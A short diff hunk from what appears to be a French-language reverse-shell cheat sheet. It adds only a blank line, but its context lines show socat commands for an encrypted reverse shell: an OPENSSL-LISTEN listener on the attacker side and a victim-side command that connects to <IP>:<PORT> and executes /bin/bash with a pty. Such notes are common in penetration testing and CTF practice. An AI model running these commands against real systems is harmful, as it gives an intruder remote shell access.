@@ -66,6 +66,7 @@ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
 ```
 
 [Victime]
+
 linux
 ```
 socat OPENSSL:<IP>:<PORT>,verify=0 EXEC:/bin/bash,pty,stderr,sigint,setsid,sane
